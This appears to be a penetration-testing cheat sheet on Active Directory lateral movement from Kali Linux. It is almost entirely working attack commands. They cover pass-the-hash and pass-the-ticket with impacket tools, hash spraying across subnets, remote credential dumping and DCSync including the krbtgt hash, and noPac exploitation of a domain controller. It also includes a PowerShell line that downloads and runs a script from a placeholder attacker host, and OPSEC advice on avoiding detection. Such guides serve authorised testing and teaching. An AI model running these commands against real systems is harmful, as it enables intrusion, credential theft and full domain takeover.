---
title: "Lateral Movement — From Kali"
weight: 5
tags: ["ad", "lateral-movement", "impacket", "pass-the-hash", "kali"]
---

## Quick Reference

| Technique | Tool | Auth Type | Notes |
|---|---|---|---|
| Pass-the-Hash | psexec.py, wmiexec.py, nxc | NTLM hash | No plaintext needed |
| Pass-the-Ticket | psexec.py -k, wmiexec.py -k | Kerberos ccache | Set KRB5CCNAME first |
| Evil-WinRM | evil-winrm | Password / Hash / Ticket | WinRM port 5985/5986 |
| WMI Execution | wmiexec.py | Password / Hash | Output shown, less noisy |
| DCOM Execution | dcomexec.py | Password / Hash | Multiple COM objects |
| RDP PtH | xfreerdp /pth | NTLM hash | Requires Restricted Admin mode |
| SMB Exec | psexec.py, smbexec.py | Password / Hash | Different noise levels |
| Proxychains | proxychains + any tool | Any | Internal network pivoting |

---

## Pass-the-Hash (PtH) from Linux

### Concept

NTLM authentication does not require knowledge of the plaintext password — it only requires the NT hash. The NT hash is the MD4 hash of the Unicode password, and it is used directly in the NTLM challenge-response exchange. A valid NT hash is sufficient to authenticate against any service using NTLM.

The impacket format for hashes is `LM_HASH:NT_HASH`. The LM hash is rarely used in modern environments and can be set to the empty LM value (`aad3b435b51404eeaad3b435b51404ee`) or simply omitted with a leading colon: `-hashes :NTLM_HASH`.

### psexec.py — PtH

Creates a service on the target and provides SYSTEM-level shell. Writes a binary to `ADMIN$` — noisiest of the impacket exec methods:

```bash
psexec.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP
```

Specify a command instead of interactive shell:

```bash
psexec.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP cmd.exe /c whoami
```

### wmiexec.py — PtH

Uses WMI (DCOM) for execution. Runs commands as the authenticated user (not SYSTEM). Shows command output. Less noisy than psexec:

```bash
wmiexec.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP
```

Run a single command:

```bash
wmiexec.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP "cmd /c ipconfig /all"
```

Use PowerShell instead of cmd:

```bash
wmiexec.py -hashes :NTLM_HASH -shell-type powershell TARGET_DOMAIN/USERNAME@TARGET_IP
```

### smbexec.py — PtH

Service-based execution. Does not write a binary to disk (uses cmd.exe via service). No interactive shell output — commands run in background:

```bash
smbexec.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP
```

### atexec.py — PtH

Executes a command via the Task Scheduler. Useful when other exec methods are blocked. Returns command output:

```bash
atexec.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP "cmd /c whoami"
```

```bash
atexec.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP "cmd /c net user"
```

### NetExec (nxc) — PtH

```bash
nxc smb TARGET_IP -u USERNAME -H NTLM_HASH
```

Execute a command:

```bash
nxc smb TARGET_IP -u USERNAME -H NTLM_HASH -x "whoami"
```

Execute a PowerShell command:

```bash
nxc smb TARGET_IP -u USERNAME -H NTLM_HASH -X "Get-Process | Select-Object Name,Id"
```

Spray a hash across an entire subnet:

```bash
nxc smb 192.168.1.0/24 -u USERNAME -H NTLM_HASH --local-auth
```

> **Note:** The `--local-auth` flag targets local accounts rather than domain accounts. This is useful for spraying local administrator hashes — if multiple machines share the same local admin password (a common misconfiguration), the same hash will work across all of them. Without `--local-auth`, nxc authenticates against the domain.

### Local Admin Hash Reuse

A common finding in Active Directory environments is that multiple workstations were imaged with the same local administrator password, meaning the NT hash is identical across machines. Use nxc to identify all machines where a recovered local admin hash works:

```bash
nxc smb 192.168.1.0/24 -u Administrator -H NTLM_HASH --local-auth | grep "+"
```

The `+` in output indicates successful authentication. If this returns many results, you have lateral movement paths to all those machines.

> **OPSEC:** Local admin PtH at scale generates many authentication events. Spray slowly or target specific machines. Microsoft LAPS (Local Administrator Password Solution) mitigates this by randomising local admin passwords per machine — check if it is deployed with `nxc ldap DC_IP -u USERNAME -p PASSWORD -M laps`.

---

## Pass-the-Ticket (PtT) from Linux

### Concept

Kerberos authentication uses tickets stored in memory (or as `.ccache` files on Linux). If you obtain a valid TGT or service ticket (ST), you can present it to Kerberos-enabled services without knowing the user's password. The `KRB5CCNAME` environment variable tells Kerberos tools which cache file to use.

### Obtaining a TGT

With password:

```bash
getTGT.py TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP
```

With NTLM hash:

```bash
getTGT.py TARGET_DOMAIN/USERNAME -hashes :NTLM_HASH -dc-ip DC_IP
```

With AES256 key:

```bash
getTGT.py TARGET_DOMAIN/USERNAME -aesKey AES256_HASH -dc-ip DC_IP
```

This produces `USERNAME.ccache` in the current directory.

### Setting the Ticket

```bash
export KRB5CCNAME=/path/to/USERNAME.ccache
```

Verify the ticket contents:

```bash
klist
```

### psexec.py — PtT

```bash
psexec.py -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME.TARGET_DOMAIN
```

### wmiexec.py — PtT

```bash
wmiexec.py -k -no-pass TARGET_DOMAIN/USERNAME@TARGET_HOSTNAME.TARGET_DOMAIN
```

Run a command:

```bash
wmiexec.py -k -no-pass TARGET_DOMAIN/USERNAME@TARGET_HOSTNAME.TARGET_DOMAIN "cmd /c whoami"
```

### smbexec.py — PtT

```bash
smbexec.py -k -no-pass TARGET_DOMAIN/USERNAME@TARGET_HOSTNAME.TARGET_DOMAIN
```

### SMB client access

```bash
smbclient.py -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME.TARGET_DOMAIN
```

### DCSync with Ticket

```bash
secretsdump.py -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME.TARGET_DOMAIN -just-dc-ntlm
```

> **Note:** Kerberos requires the hostname (FQDN) rather than IP address, because the SPN is tied to the hostname. Using an IP will cause Kerberos to fall back to NTLM, which ignores the ticket. Always use the FQDN when using `-k -no-pass`.

---

## Evil-WinRM

Evil-WinRM provides a fully-featured WinRM (Windows Remote Management) shell with built-in upload/download, script loading, and AMSI bypass capabilities. It connects to WinRM on port 5985 (HTTP) or 5986 (HTTPS).

### Basic Authentication

```bash
evil-winrm -i TARGET_IP -u USERNAME -p 'PASSWORD'
```

With domain specification:

```bash
evil-winrm -i TARGET_IP -u TARGET_DOMAIN\\USERNAME -p 'PASSWORD'
```

### Pass-the-Hash

```bash
evil-winrm -i TARGET_IP -u USERNAME -H NTLM_HASH
```

> **Note:** Evil-WinRM's PtH uses NTLM authentication over WinRM. This works when the account has WinRM access (member of Remote Management Users or Administrators).

### Pass-the-Ticket (Kerberos)

```bash
KRB5CCNAME=ticket.ccache evil-winrm -i TARGET_HOSTNAME -r TARGET_DOMAIN
```

The `-r` flag specifies the Kerberos realm (domain). Use the FQDN or hostname, not the IP, for Kerberos to work.

### File Operations

Upload a file to the remote host:

```bash
*Evil-WinRM* PS C:\> upload /local/path/to/file.exe
```

Download a file from the remote host:

```bash
*Evil-WinRM* PS C:\> download C:\Windows\System32\interesting_file.txt /local/destination/
```

### Loading PowerShell Scripts

Load scripts at startup using the `-s` flag, pointing to a local directory:

```bash
evil-winrm -i TARGET_IP -u USERNAME -p 'PASSWORD' -s /opt/PowerSploit/Recon/
```

Once connected, load a script from the menu:

```bash
*Evil-WinRM* PS C:\> menu
*Evil-WinRM* PS C:\> Invoke-Portscan
```

Or directly invoke it if loaded with `-s`:

```bash
*Evil-WinRM* PS C:\> PowerView.ps1
*Evil-WinRM* PS C:\> Get-DomainUser
```

### Loading .NET Executables

```bash
evil-winrm -i TARGET_IP -u USERNAME -p 'PASSWORD' -e /path/to/executables/
*Evil-WinRM* PS C:\> Invoke-Binary /path/to/Rubeus.exe kerberoast /nowrap
```

### AMSI Note

Evil-WinRM includes a built-in AMSI bypass that is applied automatically. If AMSI detection still triggers, the bypass may be failing against the specific patched version on the target. In that case, you may need to encode your payload or use alternative bypass methods.

> **OPSEC:** WinRM connections are logged in the Windows Event Log under `Microsoft-Windows-WinRM/Operational`. The connection itself and all commands run are recorded. Consider this when operating in environments with active monitoring.

---

## WMI Execution

### wmiexec.py — Interactive Shell

```bash
wmiexec.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

With hash:

```bash
wmiexec.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP
```

### wmiexec.py — Single Command

```bash
wmiexec.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP "cmd /c ipconfig"
```

```bash
wmiexec.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP "cmd /c net user /domain"
```

### PowerShell Shell Mode

```bash
wmiexec.py -shell-type powershell TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

Run a PowerShell command:

```bash
wmiexec.py -shell-type powershell TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP "Get-Process"
```

### Output Behaviour

wmiexec creates a temporary file in `C:\Windows\` to capture command output and reads it back over SMB. This means:

- Commands that produce output will show that output in your terminal
- The temporary file is deleted after reading
- Large outputs may be truncated — redirect to a file if needed:

```bash
wmiexec.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP "cmd /c dir C:\Users /s > C:\Windows\Temp\out.txt"
```

Then read the file:

```bash
wmiexec.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP "type C:\Windows\Temp\out.txt"
```

> **OPSEC:** WMI creates processes under `WmiPrvSE.exe`. The spawned child processes (cmd.exe, powershell.exe) are visible in process listings. WMI activity is logged under `Microsoft-Windows-WMI-Activity/Operational`.

---

## SMB Execution Methods

### psexec.py

The most well-known method. Writes a randomly-named service executable to `ADMIN$` (maps to `C:\Windows\`), creates and starts a service, and provides an interactive SYSTEM shell over a named pipe.

```bash
psexec.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

```bash
psexec.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP
```

**Characteristics:**
- Shell runs as SYSTEM
- Writes a binary to disk
- Creates a Windows service (very noisy)
- Detected by most EDRs
- Requires ADMIN$ share access

### smbexec.py

Creates a temporary service that runs `cmd.exe` directly. No binary is written to disk. The service is created and deleted for each command execution.

```bash
smbexec.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

```bash
smbexec.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP
```

**Characteristics:**
- Shell runs as SYSTEM
- No binary written to disk
- Creates/deletes a service per command
- No interactive output to stdout — use the shell to write output to files
- Slightly less noisy than psexec but still creates service events

### NetExec exec methods

nxc supports specifying the execution method explicitly:

WMI execution:

```bash
nxc smb TARGET_IP -u USERNAME -p 'PASSWORD' --exec-method wmiexec -x "cmd /c whoami"
```

MMC execution (DCOM via MMC20):

```bash
nxc smb TARGET_IP -u USERNAME -p 'PASSWORD' --exec-method mmcexec -x "cmd /c whoami"
```

SMB service execution:

```bash
nxc smb TARGET_IP -u USERNAME -p 'PASSWORD' --exec-method smbexec -x "cmd /c whoami"
```

With hash, using base64-encoded PowerShell:

```bash
nxc smb TARGET_IP -u USERNAME -H NTLM_HASH -X "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/script.ps1')"
```

Base64-encoded PowerShell command:

```bash
nxc smb TARGET_IP -u USERNAME -H NTLM_HASH -x "powershell -enc BASE64_ENCODED_COMMAND"
```

### Choosing the Right Method

| Method | Noise Level | Runs As | Binary to Disk | Use When |
|---|---|---|---|---|
| psexec.py | Highest | SYSTEM | Yes | Need SYSTEM, speed over stealth |
| smbexec.py | High | SYSTEM | No | Need SYSTEM, no disk writes |
| wmiexec.py | Medium | User | No | Want user context, output needed |
| dcomexec.py | Medium | User | No | WMI/SMB blocked, DCOM allowed |
| atexec.py | Low | SYSTEM | No | Single command, task scheduler |

---

## DCOM Lateral Movement

### Concept

DCOM (Distributed COM) allows COM objects to be instantiated on remote machines. Several DCOM objects support method calls that result in code execution. This technique requires local admin rights on the target. DCOM uses port 135 (RPC endpoint mapper) plus dynamic high ports.

### dcomexec.py — MMC20.Application

```bash
dcomexec.py -object MMC20 TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP "cmd /c whoami"
```

With hash:

```bash
dcomexec.py -object MMC20 -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP "cmd /c whoami"
```

### dcomexec.py — ShellWindows

```bash
dcomexec.py -object ShellWindows TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP "cmd /c whoami"
```

With hash:

```bash
dcomexec.py -object ShellWindows -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP "cmd /c whoami"
```

### dcomexec.py — ShellBrowserWindow

```bash
dcomexec.py -object ShellBrowserWindow TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP "cmd /c whoami"
```

### Getting Interactive Output

dcomexec does not provide interactive shell output by default. Use a file redirect:

```bash
dcomexec.py -object MMC20 TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP \
  "cmd /c whoami > C:\Windows\Temp\out.txt"
```

Then read the output file via SMB:

```bash
smbclient.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP
# shares → use C$ → get Windows\Temp\out.txt
```

> **OPSEC:** DCOM execution spawns `explorer.exe` or `mmc.exe` child processes, which may be less suspicious than `svchost.exe` spawning `cmd.exe`. However, DCOM lateral movement is still detectable via Sysmon event ID 10 (process access) and Windows Security event 4688 (process creation).

---

## RDP from Kali

### Standard RDP

Using xfreerdp:

```bash
xfreerdp /v:TARGET_IP /u:USERNAME /p:'PASSWORD' /cert:ignore
```

With domain:

```bash
xfreerdp /v:TARGET_IP /u:USERNAME /d:TARGET_DOMAIN /p:'PASSWORD' /cert:ignore
```

Useful xfreerdp flags:

```bash
xfreerdp /v:TARGET_IP /u:USERNAME /p:'PASSWORD' /cert:ignore \
  /dynamic-resolution \
  /drive:kali,/home/kali/share \
  /clipboard
```

`/drive:kali,/home/kali/share` mounts a local directory as a shared drive on the remote host, enabling easy file transfer.

Using rdesktop (older alternative):

```bash
rdesktop -u USERNAME -p 'PASSWORD' TARGET_IP
```

### Pass-the-Hash via RDP (Restricted Admin Mode)

Windows supports a mode called **Restricted Admin**, which allows RDP connections using only the NTLM hash (no plaintext password). In this mode, the user's credentials are not sent to the remote host, which prevents credential delegation — but it also means you can authenticate with just a hash.

Check if Restricted Admin mode is enabled on the target (requires existing shell access):

```bash
# Via existing shell or nxc
nxc smb TARGET_IP -u USERNAME -H NTLM_HASH -x \
  "reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin"
```

A value of `0` means Restricted Admin is **enabled**. A value of `1` or the key being absent means it is disabled.

Enable Restricted Admin mode if you have an existing shell:

```bash
# Via wmiexec or similar
wmiexec.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP \
  "reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
```

RDP with hash once Restricted Admin is enabled:

```bash
xfreerdp /v:TARGET_IP /u:USERNAME /pth:NTLM_HASH /cert:ignore
```

> **Note:** Restricted Admin mode means the RDP session does not have outbound network access using the logged-in user's credentials. If you need network access from within the RDP session (e.g., to access other machines), you will need to inject credentials or use `runas`.

### RDP Session Hijacking (if you have SYSTEM)

If you have SYSTEM-level access on a machine where another user is connected via RDP, you can hijack their session without knowing their credentials:

```bash
# List sessions (via existing shell)
wmiexec.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP "query session"
```

---

## Pivoting and Proxychains

### Dynamic Port Forwarding via SSH

If you have SSH access to a jump host (Linux or compromised machine with SSH):

```bash
ssh -D 1080 -N -f user@JUMP_HOST_IP
```

`-D 1080` opens a SOCKS5 proxy on local port 1080
`-N` does not execute a remote command
`-f` forks to background

Configure proxychains by editing `/etc/proxychains4.conf`:

```
[ProxyList]
socks5  127.0.0.1 1080
```

Now prepend `proxychains` to any tool:

```bash
proxychains nxc smb INTERNAL_TARGET_IP -u USERNAME -p 'PASSWORD'
proxychains nxc smb 10.10.10.0/24 -u USERNAME -p 'PASSWORD' --shares
proxychains secretsdump.py TARGET_DOMAIN/USERNAME:PASSWORD@INTERNAL_DC_IP
```

### ntlmrelayx SOCKS Mode

ntlmrelayx can maintain authenticated SOCKS sessions after relaying credentials:

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -socks
```

After a relay succeeds, the session is available as a SOCKS proxy. Type `socks` at the ntlmrelayx prompt to list available sessions:

```
ntlmrelayx> socks
Protocol  Target          Username         AdminStatus  Port
--------  --------------  ---------------  -----------  ----
SMB       TARGET_IP       TARGET_DOMAIN/USERNAME  TRUE   445
```

Use via proxychains (ntlmrelayx runs SOCKS on port 1080 by default):

```bash
proxychains psexec.py -no-pass TARGET_DOMAIN/USERNAME@TARGET_IP
proxychains secretsdump.py -no-pass TARGET_DOMAIN/USERNAME@TARGET_IP
```

The credentials for the SOCKS session are preserved in memory — you do not need to supply them again.

### Ligolo-ng (Advanced Pivoting)

Ligolo-ng provides a TUN interface for transparent pivoting without needing proxychains:

On the Kali attack host, start the proxy:

```bash
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

On the compromised pivot host (upload the agent binary):

```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert
```

Back on Kali in the ligolo-ng prompt, set up the tunnel:

```
>> session
>> 1
>> start
```

Add a route for the internal network:

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

Now tools connect directly to internal hosts without proxychains.

---

## Service Ticket Lateral Movement

### Requesting a Service Ticket for a Specific Service

```bash
getST.py -spn cifs/TARGET_HOSTNAME.TARGET_DOMAIN \
  TARGET_DOMAIN/USERNAME:PASSWORD \
  -dc-ip DC_IP
```

With hash:

```bash
getST.py -spn cifs/TARGET_HOSTNAME.TARGET_DOMAIN \
  -hashes :NTLM_HASH \
  TARGET_DOMAIN/USERNAME \
  -dc-ip DC_IP
```

### Using the Service Ticket

```bash
export KRB5CCNAME=USERNAME.ccache
```

SMB access:

```bash
smbclient.py -k -no-pass TARGET_DOMAIN/USERNAME@TARGET_HOSTNAME.TARGET_DOMAIN
```

Get a shell:

```bash
psexec.py -k -no-pass TARGET_DOMAIN/USERNAME@TARGET_HOSTNAME.TARGET_DOMAIN
```

WMI shell:

```bash
wmiexec.py -k -no-pass TARGET_DOMAIN/USERNAME@TARGET_HOSTNAME.TARGET_DOMAIN
```

### Requesting Tickets for Multiple Services

You can request tickets for different services on the same host:

```bash
# CIFS for file access
getST.py -spn cifs/DC_HOSTNAME.TARGET_DOMAIN TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP

# HTTP for web services / WinRM
getST.py -spn http/TARGET_HOSTNAME.TARGET_DOMAIN TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP

# LDAP for directory operations
getST.py -spn ldap/DC_HOSTNAME.TARGET_DOMAIN TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP
```

---

## Credential Dumping after Lateral Movement

Once you have execution on a target, the next step is usually to harvest credentials for further movement.

### secretsdump.py — Remote

Dump hashes remotely from the SAM database (local accounts) and LSA secrets:

```bash
secretsdump.py TARGET_DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

With hash:

```bash
secretsdump.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP
```

Only local accounts (no domain creds needed for SAM):

```bash
secretsdump.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP -sam
```

Only LSA secrets (service account credentials, cached domain logons):

```bash
secretsdump.py -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME@TARGET_IP -lsa
```

### secretsdump.py — DCSync

Replication from a domain controller:

```bash
secretsdump.py -just-dc TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP
```

Only NTLM hashes:

```bash
secretsdump.py -just-dc-ntlm TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP
```

Specific user:

```bash
secretsdump.py -just-dc-user Administrator TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP
```

With krbtgt (for Golden Ticket):

```bash
secretsdump.py -just-dc-user krbtgt TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP
```

### nxc — Credential Dumping Modules

SAM dump:

```bash
nxc smb TARGET_IP -u USERNAME -H NTLM_HASH --sam
```

LSA secrets:

```bash
nxc smb TARGET_IP -u USERNAME -H NTLM_HASH --lsa
```

NTDS (DCSync, requires DA):

```bash
nxc smb DC_IP -u USERNAME -H NTLM_HASH --ntds
```

Dump LAPS passwords (if LAPS is deployed and you have read access):

```bash
nxc ldap DC_IP -u USERNAME -p 'PASSWORD' -M laps
```

---

## NoPac (CVE-2021-42278 / CVE-2021-42287)

NoPac chains two vulnerabilities: the ability to rename a machine account's `sAMAccountName` to match a DC name (CVE-2021-42278) and a KDC logic flaw in PAC generation (CVE-2021-42287). The result is impersonation of a domain controller account and full domain compromise with only a standard domain user account.

Check if the environment is vulnerable:

```bash
sudo python3 scanner.py TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -use-ldap
```

A "Vulnerable" result in the output confirms the vulnerability is present.

Exploit for an interactive shell as Administrator:

```bash
sudo python3 noPac.py TARGET_DOMAIN/USERNAME:PASSWORD \
  -dc-ip DC_IP \
  -dc-host DC_HOSTNAME \
  -shell \
  --impersonate administrator \
  -use-ldap
```

Exploit with DCSync to dump the administrator hash directly:

```bash
sudo python3 noPac.py TARGET_DOMAIN/USERNAME:PASSWORD \
  -dc-ip DC_IP \
  -dc-host DC_HOSTNAME \
  --impersonate administrator \
  -use-ldap \
  -dump \
  -just-dc-user TARGET_DOMAIN/administrator
```

The TGT obtained during exploitation is saved to the current directory as a `.ccache` file and can be used for further operations.

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
